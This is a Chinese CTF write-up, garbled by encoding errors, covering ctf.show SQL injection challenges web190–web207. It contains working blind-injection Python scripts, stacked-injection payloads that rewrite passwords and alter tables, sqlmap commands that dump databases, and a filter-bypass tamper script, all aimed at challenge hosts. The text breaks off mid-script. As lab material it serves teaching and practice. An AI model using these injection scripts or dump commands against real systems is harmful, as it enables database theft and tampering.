åˆ¤æ–­\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;;\r}\r//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª\ræ‰€ä»¥è¿™é¢˜ä¾æ—§å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # æŸ¥æ•°æ®åº“ 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥å­—æ®µ 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # æŸ¥flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;å¯†ç é”™è¯¯\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web191 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¯†ç æ£€æµ‹ 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //å¯†ç åˆ¤æ–­ 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 17 } 18 19 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª 20 if(preg_match(\u0026#39;/file|into|ascii/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 22 die(json_encode($ret)); 23 } è¿™é¢˜å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåªæ˜¯åŠ äº†ç‚¹banæ‰äº†ascii\næˆ‘ä»¬ç”¨ordä»£æ›¿asciiå³å¯\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # æŸ¥æ•°æ®åº“ 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥å­—æ®µ 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # æŸ¥flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ord(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;å¯†ç é”™è¯¯\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web192 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¯†ç æ£€æµ‹ 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //å¯†ç åˆ¤æ–­ 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 17 } 18 19 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 22 die(json_encode($ret)); 23 } ä¸ç»™æˆ‘è½¬æ˜¯å§ï¼Œé‚£æˆ‘ä¸è½¬äº†\n1import requests 2import string 3 4url = \u0026#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/\u0026#34; 5flagstr=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 6flag = \u0026#39;\u0026#39; 7for i in range(1,45): 8 for j in flagstr: 9 payload = f\u0026#34;admin\u0026#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(\u0026#39;{j}\u0026#39;),1,2)=\u0026#39;1\u0026#34; 10 data = { 11 \u0026#39;username\u0026#39;: payload, 12 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 13 } 14 r = requests.post(url, data=data) 15 if \u0026#34;å¯†ç é”™è¯¯\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 16 flag += j 17 print(flag) 18 if \u0026#34;}\u0026#34; in flag: 19 exit(0) 20 break å…¶å®ä¹Ÿå·®ä¸å¤š\näºŒåˆ†æ³•è„šæœ¬\n1 2# ç”¨äº†äºŒåˆ†æ³• dejavu~~~ 3import requests 4 5url = \u0026#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/\u0026#34; 6# è¡¨å CtFsHOw{FL0G,CtFsHOw{usEr 7# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 8# åˆ—å ID,F1AG,ID,usErNAME,pAss 9# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 10# flag 11payload = \u0026#34;0\u0026#39; or if(substr((select f1ag from ctfshow_fl0g),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 12true_flag = \u0026#34;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\u0026#34; 13result = \u0026#34;\u0026#34; 14index = 1 15while True: 16 start = 32 17 end = 127 18 while not (abs(start-end) == 1 or start == end): 19 p = (start + end) // 2 20 data = { 21 \u0026#34;username\u0026#34;: payload.format(index, chr(p)), 22 \u0026#34;password\u0026#34;: 0 23 } 24 response = None 25 while True: 26 try: 27 response = requests.post(url, data=data) 28 except: 29 continue 30 break 31 if true_flag in response.text: 32 start = p 33 else: 34 end = p 35 if end \u0026lt; start: 36 end = start 37 result += chr(end) 38 print(f\u0026#34;[*] result: {result}\u0026#34;) 39 index += 1 web193 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¯†ç æ£€æµ‹ 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //å¯†ç åˆ¤æ–­ 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 17 } 18 19 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 22 die(json_encode($ret)); 23 } æ–°å¢wafï¼šsubstr\næ²¡åŠæ³•è¿›è¡Œæˆªæ–­ï¼Œä½†å…¶å®é—®é¢˜ä¸å¤§\n1import requests 2import sys 3url = \u0026#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/\u0026#39; 4result = \u0026#39;\u0026#39; 5letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-_,{}\u0026#39; 6 7for i in range(100): 8 for j in letter: 9 # æŸ¥è¡¨ 10 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 11 # æŸ¥å­—æ®µ 12 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 13 # æŸ¥flag 14 payload = \u0026#34;select group_concat(f1ag) from ctfshow_flxg\u0026#34; 15 16 data={ 17 \u0026#39;username\u0026#39;:\u0026#34;admin\u0026#39; and if(({}) like \u0026#39;{}%\u0026#39;,1,2) =\u0026#39;1\u0026#34;.format(payload,result+j), 18 \u0026#39;password\u0026#39;:1 19 } 20 res = requests.post(url=url,data=data) 21 if \u0026#34;å¯†ç é”™è¯¯\u0026#34; == res.json()[\u0026#39;msg\u0026#39;]: 22 result += j 23 print(result) 24 break 25 if \u0026#34;}\u0026#34; in result: 26 exit(0) æˆ‘ä»¬å¯ä»¥ç”¨likeæ¥è¾¾åˆ°å·®ä¸å¤šçš„æ•ˆæœ\nè¿™é¢˜ä¹Ÿå¯ä»¥ç”¨char,left,right,substringä¹‹ç±»çš„æ–¹æ³•\nweb194 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¯†ç æ£€æµ‹ 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //å¯†ç åˆ¤æ–­ 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 17 } 18 19 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 22 die(json_encode($ret)); 23 } æ–°å¢wafï¼šchar|left|right|substring\nä¸Šé¢˜çš„æ–¹æ³•ä¾æ—§é€‚ç”¨\nweb195 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¯†ç æ£€æµ‹ 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //å¯†ç åˆ¤æ–­ 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 17 } 18 19 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§ 20 if(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 22 die(json_encode($ret)); 23 } 24 25 if($row[0]==$password){ 26 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;ç™»é™†æˆåŠŸ flag is $flag\u0026#34;; 27 } æ ¹æ®æç¤ºå †å æ³¨å…¥\nå…¶å®å°±æ˜¯åœ¨;åé¢å†æ‰§è¡Œä»»æ„çš„sqlå‘½ä»¤\nè¿™é‡Œç›´æ¥æ”¹å¯†ç \npayload=\u0026#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;\u0026#34;\r# è‡³äºä¸ºä»€ä¹ˆéå¾—ç”¨åå…­è¿›åˆ¶ç™»å½•ï¼Œæ˜¯å› ä¸ºä¸‹é¢è¿™ä¸ªæ²¡æœ‰å­—ç¬¦ä¸²å•å¼•å·åŒ…å›´\rsql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\r# @Author:Y4tacker admin \u0026lt;=\u0026gt; 0x61646d696e\r111\u0026lt;=\u0026gt;0x313131 web196 æŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\rè¿”å›é€»è¾‘\r//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§\rif(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;;\rdie(json_encode($ret));\r}\rif(strlen($username)\u0026gt;16){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åä¸èƒ½è¶…è¿‡16ä¸ªå­—ç¬¦\u0026#39;;\rdie(json_encode($ret));\r}\rif($row[0]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#34;ç™»é™†æˆåŠŸ flag is $flag\u0026#34;;\r}\rè¿™é¢˜åº”è¯¥æ˜¯bugäº†ï¼Œselectæ²¡è¢«waf\nåœ¨ PHP é‡Œï¼Œå½“ä½¿ç”¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ä»æ•°æ®åº“ä¸­è·å–ç»“æœé›†æ—¶ï¼Œé€šå¸¸ä¼šé€è¡Œéå†ç»“æœé›†ã€‚æ¯ä¸€è¡Œæ•°æ®å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„æ¥è¡¨ç¤ºï¼Œ$row[0] æŒ‡çš„æ˜¯è¿™ä¸€è¡Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚\npayload:\n0;select(2)\r2 web197 1æŸ¥è¯¢è¯­å¥ 2 3 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 9 //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§ 10 if(\u0026#39;/\\*|\\#|\\-|\\x23|\\\u0026#39;|\\\u0026#34;|union|or|and|\\x26|\\x7c|file|into|select|update|set//i\u0026#39;, $username)){ 11 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;; 12 die(json_encode($ret)); 13 } 14 15 if($row[0]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;ç™»é™†æˆåŠŸ flag is $flag\u0026#34;; 17 } 18 è¿™æŠŠä¸èƒ½ç”¨selectï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ç»™$row[0]ä¸€ä¸ªç¡®å®šçš„å€¼å³å¯\næ¯”å¦‚\nusername: 1;show tables password: ctfshow_user å…¶ä»–çš„ä¸€äº›éªšæ“ä½œ\né‡å†™ctfshow_userè¡¨\næŠŠå¯†ç å’Œidåˆ—äº’æ¢ä¹‹åçˆ†å¯†ç ï¼ˆå®é™…ä¸Šåœ¨çˆ†idï¼‰\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\u0026#34; 5for i in range(100): 6 if i == 0: 7 data = { 8 \u0026#39;username\u0026#39;: \u0026#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user \u0026#39; 9 \u0026#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` \u0026#39; 10 \u0026#39;varchar(255);\u0026#39;, 11 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 12 } 13 r = requests.post(url, data=data) 14 data = { 15 \u0026#39;username\u0026#39;: \u0026#39;0x61646d696e\u0026#39;, 16 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 17 } 18 r = requests.post(url, data=data) 19 if \u0026#34;ç™»é™†æˆåŠŸ\u0026#34; in r.json()[\u0026#39;msg\u0026#39;]: 20 print(r.json()[\u0026#39;msg\u0026#39;]) 21 break web198 åŒweb197\nweb199 é€šè§£ä¸€æŠŠæ¢­\nweb200 é€šè§£ä¸€æŠŠæ¢­\nweb190-web200é€šè§£ username=0;show tables;\rpass=ctfshow_user sqlmapçš„ä½¿ç”¨ web201 sqlmapæœ€æ–°ç‰ˆä¸‹è½½\rä½¿ç”¨--user-agent æŒ‡å®šagent\rä½¿ç”¨--referer ç»•è¿‡refereræ£€æŸ¥ æ£€æµ‹æ³¨å…¥ç±»å‹\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show\rçˆ†æ•°æ®åº“\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs\rçˆ†è¡¨\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables çˆ†åˆ—\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns\rçˆ†å€¼\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web202 sqlmapæœ€æ–°ç‰ˆä¸‹è½½\rä½¿ç”¨--data è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼ //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\r//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º\r} é€šè¿‡å‘å‘½ä»¤è¡ŒåŠ å…¥\u0026ndash;dataå‚æ•°è½¬åŒ–è¯·æ±‚æ–¹å¼ä¸ºpost\nsqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data \u0026#39;id=1\u0026#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web203 sqlmapæœ€æ–°ç‰ˆä¸‹è½½\rä½¿ç”¨--method è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼ æŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\r//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º\r} \u0026ndash;headers=\u0026ldquo;Content-Type: text/plain\u0026rdquo; ä»¥è¡¨å•å½¢å¼å‘é€\nsqlmap -u \u0026#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web204 ä½¿ç”¨--cookie æäº¤cookieæ•°æ® payload:\nsqlmap -u \u0026#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917\r6f63d87074e926a342a996872\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web205 apiè°ƒç”¨éœ€è¦é‰´æƒ é€šè¿‡æŠ“åŒ…åˆ†æï¼Œåœ¨æ¯æ¬¡è¯·æ±‚url/api/index.phpä¹‹å‰éœ€è¦å…ˆè¯·æ±‚URL/api/getTokn.php\npayloadï¼š\nsqlmap -u \u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=60prkqe8189934t5pv3ikepa16\u0026#34; --safe-url=\u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump web206 sqléœ€è¦é—­åˆ //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\rsqlmapä¼šè‡ªåŠ¨æ„é€ é—­åˆï¼Œæ‰€ä»¥è·Ÿå‰ä¸€é¢˜æ²¡ä»€ä¹ˆåŒºåˆ«\nä½†æ˜¯ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ„é€ ä¸€ä¸‹\npayload:\næ ¹æ®sqlè¯­å¥ï¼Œæˆ‘ä»¬é‡‡ç”¨â€œ)#â€çš„æ–¹å¼è¿›è¡Œå³é—­åˆã€‚----suffix=\u0026#34;)#\u0026#34;\ræ‰§è¡Œsqlmapå‘½ä»¤è¡Œ\rsqlmap -u \u0026#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;\u0026#34; --safe-url=\u0026#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; --dbs\rsqlmap -u \u0026#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;\u0026#34; --safe-url=\u0026#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; -D ctfshow_web --tables\rsqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --dbms=mysql -D \u0026#34;ctfshow_web\u0026#34; -T \u0026#34;ctfshow_flaxc\u0026#34; -C \u0026#34;flagv\u0026#34; --dump --headers=\u0026#34;Content-Type: text/plain\u0026#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 web207 Sqlmap Tamper ç¼–å†™\nç¤ºä¾‹\n1#!/usr/bin/env python 2 3\u0026#34;\u0026#34;\u0026#34; 4Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) 5See the file \u0026#39;doc/COPYING\u0026#39; for copying permission 6\u0026#34;\u0026#34;\u0026#34; 7 8from lib.core.enums import PRIORITY 9__priority__ = PRIORITY.LOW # å½“å‰è„šæœ¬è°ƒç”¨ä¼˜å…ˆç­‰çº§ 10 11def dependencies(): # å£°æ˜å½“å‰è„šæœ¬é€‚ç”¨/ä¸é€‚ç”¨çš„èŒƒå›´ï¼Œå¯ä»¥ä¸ºç©ºã€‚ 12 pass 13 14def tamper(payload, **kwargs): # ç”¨äºç¯¡æ”¹Payloadã€ä»¥åŠè¯·æ±‚å¤´çš„ä¸»è¦å‡½æ•° 15 return payload é¢˜ç›®\næŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} è¿™é‡Œä¼šå°†wafä¸­çš„å…³é”®è¯æ›¿æ¢æˆç©ºæ ¼\næ”¾ä¸€ä¸ªY4tackerå¤§ä½¬çš„è„šæœ¬\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6# å‡è®¾åœ¨Python 3ç¯å¢ƒä¸­è¿è¡Œï¼Œå°†xrangeæ›¿æ¢ä¸ºrange 7# ä»lib.core.enumsæ¨¡å—ä¸­å¯¼å…¥PRIORITYæšä¸¾ç±»å‹ 8from lib.core.enums import PRIORITY 9 10# è®¾ç½®è„šæœ¬çš„ä¼˜å…ˆçº§ä¸ºä½ 11__priority__ = PRIORITY.LOW 12 13def tamper(payload, **kwargs): 14 \u0026#34;\u0026#34;\u0026#34; 15 ç¯¡æ”¹å‡½æ•°ï¼Œè°ƒç”¨space2commentå‡½æ•°å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œå¤„ç† 16 :param payload: å¾…å¤„ç†çš„æœ‰æ•ˆè´Ÿè½½ 17 :param kwargs: å…¶ä»–å…³é”®å­—å‚æ•° 18 :return: å¤„ç†åçš„æœ‰æ•ˆè´Ÿè½½ 19 \u0026#34;\u0026#34;\u0026#34; 20 payload = space2comment(payload) 21 return payload 22 23def space2comment(payload): 24 \u0026#34;\u0026#34;\u0026#34; 25 å°†æœ‰æ•ˆè´Ÿè½½ä¸­çš„ç©ºæ ¼å­—ç¬¦æ›¿æ¢ä¸ºæ¢è¡Œç¬¦ 26 :param payload: å¾…å¤„ç†çš„æœ‰æ•ˆè´Ÿè½½ 27 :return: å¤„ç†åçš„æœ‰æ•ˆè´Ÿè½½ 28 \u0026#34;\u0026#34;\u0026#34; 29 retVal = payload 30 if payload: 31 retVal = \u0026#34;\u0026#34; 32 # ç”¨äºè·Ÿè¸ªæ˜¯å¦åœ¨å•å¼•å·å†… 